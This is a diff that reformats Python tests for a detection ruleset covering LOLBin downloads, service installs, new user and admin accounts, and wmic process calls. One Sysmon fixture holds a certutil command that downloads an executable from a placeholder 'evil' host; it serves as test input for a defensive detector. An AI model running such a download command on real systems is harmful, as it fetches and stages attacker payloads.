@@ -2,6 +2,7 @@
 Tests for the extended detection ruleset and the threshold memory-leak fix.
 Loads the real rules/ directory so the shipped YAML is exercised end-to-end.
 """
+
 import sys
 from datetime import datetime, timedelta
 from pathlib import Path
@@ -30,8 +31,12 @@ class TestExtendedRulesLoaded:
     def test_all_new_rules_present(self, engine):
         ids = {r.id for r in engine.rules}
         for rid in [
-            "lolbin_download_001", "new_service_install_001", "new_user_account_001",
-            "added_to_admin_group_001", "account_lockout_001", "wmic_process_call_001",
+            "lolbin_download_001",
+            "new_service_install_001",
+            "new_user_account_001",
+            "added_to_admin_group_001",
+            "account_lockout_001",
+            "wmic_process_call_001",
         ]:
             assert rid in ids, f"missing rule: {rid}"
 
@@ -47,7 +52,7 @@ class TestSecurityEventRules:
     def test_new_service_install(self, engine):
         r = _rule(engine, "new_service_install_001")
         assert r.matches("7045", datetime.now(), "A service was installed", "Security")
-        assert not r.matches("7045", datetime.now(), "x", "Sysmon")   # wrong provider
+        assert not r.matches("7045", datetime.now(), "x", "Sysmon")  # wrong provider
         assert not r.matches("4624", datetime.now(), "x", "Security")  # wrong id
 
     def test_new_user_account(self, engine):
@@ -73,8 +78,10 @@ class TestSysmonCommandLineRules:
 
     def test_lolbin_certutil_download(self, engine):
         r = _rule(engine, "lolbin_download_001")
-        sysmon = {"CommandLine": "certutil.exe -urlcache -f http://evil/a.exe a.exe",
-                  "Image": "C:\\Windows\\System32\\certutil.exe"}
+        sysmon = {
+            "CommandLine": "certutil.exe -urlcache -f http://evil/a.exe a.exe",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+        }
         assert r.matches("1", datetime.now(), "", "Sysmon", sysmon)
 
     def test_lolbin_certutil_decode(self, engine):
